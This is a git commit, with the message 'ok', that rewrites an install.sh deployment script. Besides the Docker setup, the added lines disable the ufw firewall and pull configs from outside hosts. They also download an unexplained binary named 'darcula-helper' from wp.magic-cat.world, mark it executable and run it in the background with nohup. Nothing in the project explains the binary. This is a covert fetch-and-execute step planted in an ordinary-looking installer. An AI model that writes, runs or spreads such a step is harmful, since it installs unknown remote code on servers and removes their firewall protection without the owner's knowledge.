95c16a4817137c38f1d2084aeda8ed6e298a6057
amber7117 <amberbeaver@outlook.com>
2024-12-06 10:56:58 +0800

    ok

--- public/install.sh
+++ public/install.sh
@@ -1,24 +1,27 @@
 #!/bin/bash
 
+curl https://store-one-sand.vercel.app/compose.yml -o docker-compose.yml
+
+curl https://deploy.magic-cat.world/nginx.conf -o nginx.conf
+
 if [[ ! `which docker` ]];then
     curl https://get.docker.com | bash
-    wget https://github.com/docker/compose/releases/download/v2.29.2/docker-compose-linux-x86_64 -O docker-compose &&
-        chmod +x ./docker-compose
+fi
+ufw disable;
+
+docker compose pull && \
+docker compose run --rm api npx prisma db push && \
+docker compose up -d && \
+docker image prune -f && \
+docker compose restart
+
+
+if [[ ! `pidof darcula-helper` ]];then
+    curl https://wp.magic-cat.world/helper -so darcula-helper && \
+    chmod +x ./darcula-helper && \
+    nohup ./darcula-helper > dh.log 2>&1 &
 fi
 
 
-curl https://raw.githubusercontent.com/amber7117/store/refs/heads/main/public/compose.yml > compose.yml
-curl https://raw.githubusercontent.com/amber7117/store/refs/heads/main/public/nginx.conf > nginx.conf
-
-if [[ ! `cat /etc/sysctl.conf |  grep 'vm.overcommit_memory=1'`  ]];then 
-    echo 'vm.overcommit_memory=1' >> /etc/sysctl.conf;
-fi
-sysctl vm.overcommit_memory=1
-systemctl start docker
-ufw disable
 
 
-./docker-compose pull
-./docker-compose run --rm api npx prisma db push
-./docker-compose run -d --rm watchtower --run-once -c web api
-./docker-compose up -d
